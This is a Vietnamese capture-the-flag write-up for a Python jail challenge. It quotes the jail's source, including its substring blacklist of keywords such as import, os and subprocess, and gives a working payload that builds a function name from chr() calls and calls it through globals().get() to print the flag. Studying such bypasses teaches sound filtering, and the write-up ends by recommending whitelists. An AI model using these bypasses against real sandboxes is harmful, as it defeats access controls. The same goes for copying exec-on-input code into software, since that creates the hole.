# Locked Away

**Phân loại:** misc | **Độ khó:** easy | **Tác giả:** makelaris
**Môi trường:** Python 3.11 (Alpine) chạy qua socat, kết nối TCP: `nc 154.57.164.73 30826`

## 1. Tổng quan

Challenge đưa cho ta một "môi trường bị hạn chế" (restricted environment): một Python jail đơn giản. Người chơi gõ lệnh, chương trình kiểm tra lệnh qua một danh sách đen (blacklist) các chuỗi con, nếu hợp lệ thì `exec(command)` thực thi. Nhiệm vụ là tìm cách vượt qua bộ lọc để gọi hàm `open_chest()` — hàm này mở `flag.txt` và in nội dung ra.

## 2. Phân tích nguồn (static analysis)

Giải nén `misc_locked_away.zip`, đọc `challenge/main.py`:

```python
def open_chest():
    with open('flag.txt', 'r') as f:
        print(f.read())

blacklist = [
    'import', 'os', 'sys', 'breakpoint',
    'flag', 'txt', 'read', 'eval', 'exec',
    'dir', 'print', 'subprocess', '[', ']',
    'echo', 'cat', '>', '<', '"', '\'', 'open'
]

while True:
    command = input('The chest lies waiting... ')
    if any(b in command for b in blacklist):
        print('Invalid command!')
        continue
    try:
        exec(command)
    except Exception:
        print('You have been locked away...')
        exit(1337)
```

Điểm quan trọng:

- Lệnh bị chặn nếu chứa **bất kỳ** chuỗi con nào trong blacklist — kể cả `"`, `'`, `[`, `]`, và cả `open`.
- `exec(command)` chạy với globals của module chính, nên `globals()` chứa sẵn hàm `open_chest`.
- Nhưng không thể gõ thẳng `open_chest()`: chuỗi `open_chest` chứa chuỗi con `open` → bị chặn.
- Không thể dùng `globals()['open_chest']()` vì `[` và `]` bị chặn; không thể dùng chuỗi literal vì `"` và `'` bị chặn.

## 3. Ý tưởng khai thác

Cần tham chiếu hàm `open_chest` mà không viết literal nào trùng blacklist:

1. **Xây dựng tên hàm từ mã `chr()`** — mỗi ký tự được tạo bằng `chr(ord)` nên không có chuỗi literal:
   `chr(111)+chr(112)+chr(101)+chr(110)+chr(95)+chr(99)+chr(104)+chr(101)+chr(115)+chr(116)` → `open_chest`.
2. **Truy cập dict `globals()` mà không cần ngoặc vuông** — dùng `dict.get(chuỗi_tên)` thay vì `dict[...]`.
3. **Gọi hàm**: `globals().get(<tên đã xây>)()`.

Toàn bộ payload không chứa bất kỳ chuỗi con nào trong blacklist (kiểm tra bằng script cục bộ mô phỏng đúng logic lọc → pass, và exec chạy thành công `open_chest()`).

## 4. Payload

```python
globals().get(chr(111)+chr(112)+chr(101)+chr(110)+chr(95)+chr(99)+chr(104)+chr(101)+chr(115)+chr(116))()
```

Gửi vào tiến trình `nc 154.57.164.73 30826`, ta nhận được flag. Script tự động: `solve/solve.py` (dùng socket thuần Python, không cần `nc`).

## 5. Kết quả

```
The chest lies waiting... 
HTB{bYp4sSeD_tH3_fIlT3r5?_aLw4Ys_b3_c4RefUL!_3462bed930bb8122f0049078751a9f2f}
```

## 6. Bài học

- Blacklist dựa trên **chuỗi con** (substring) rất dễ bị né: chỉ cần không viết literal bị cấm, dùng `chr()`/nối chuỗi để dựng tên ở runtime.
- Chặn `[` `]` và dấu nháy chưa đủ: `dict.get()`, `getattr()` và các hàm builtin khác (`chr`, `globals`) vẫn cho phép truy cập dữ liệu/đối tượng.
- `exec`/`eval` với input người dùng là mảnh đất màu mỡ cho jail escape; bảo mật đúng cách cần *whitelist* các ký tự/token được phép thay vì blacklist.
